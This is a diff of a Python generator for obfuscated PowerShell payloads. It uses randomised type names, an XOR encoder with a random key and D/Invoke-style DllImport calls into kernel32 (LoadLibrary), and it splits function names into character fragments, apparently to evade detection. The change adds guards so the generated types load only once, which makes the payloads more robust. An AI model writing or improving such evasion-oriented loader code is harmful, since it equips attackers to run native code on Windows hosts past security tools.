@@ -63,6 +63,7 @@ _host_writer = "H" + secrets.token_hex(secrets.randbelow(6) + 3)
 
 new_HostWriter    = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
 import_HostWriter = f"""
+if (-not ('{_ns}.{_host_writer}' -as [type])) {{
 Add-Type -TypeDefinition @"
 namespace {_ns} {{
 public class {_host_writer} : System.IO.TextWriter {{
@@ -74,12 +75,15 @@ public override void WriteLine(string v) {{ _act(v + System.Environment.NewLine)
 public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encoding.UTF8; }} }}
 }}
 }}
-"@"""
+"@
+}}
+"""
 
 _xor_enc = "X" + secrets.token_hex(secrets.randbelow(6) + 3)
 _xor_key = secrets.randbelow(254) + 1  # range [1, 254], never 0 (FIX-05)
 call_XorEnc   = f"[{_ns}.{_xor_enc}]::x"
 import_XorEnc = f"""
+if (-not ('{_ns}.{_xor_enc}' -as [type])) {{
 Add-Type @"
 namespace {_ns} {{
 public class {_xor_enc} {{
@@ -90,6 +94,7 @@ return y;
 }}
 }}
 "@
+}}
 """
 
 # ── dll_import: generates D/Invoke-style Add-Type payloads ───────────────────
@@ -102,7 +107,11 @@ def dll_import(ns: str, lib: str, fun: str, sigs: List[str]):
     entry = "+".join(f'"{c_}"' for c_ in fun)
     code  = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
     globals()["_call_"   + fun] = f"[{ns}.{cls}]::{name}"
-    globals()["_import_" + fun] = f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"
+    full_type = f"{ns}.{cls}"
+    globals()["_import_" + fun] = (
+        f"if (-not ('{full_type}' -as [type])) {{ "
+        f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}' }}"
+    )
 
 
 dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr","string"])
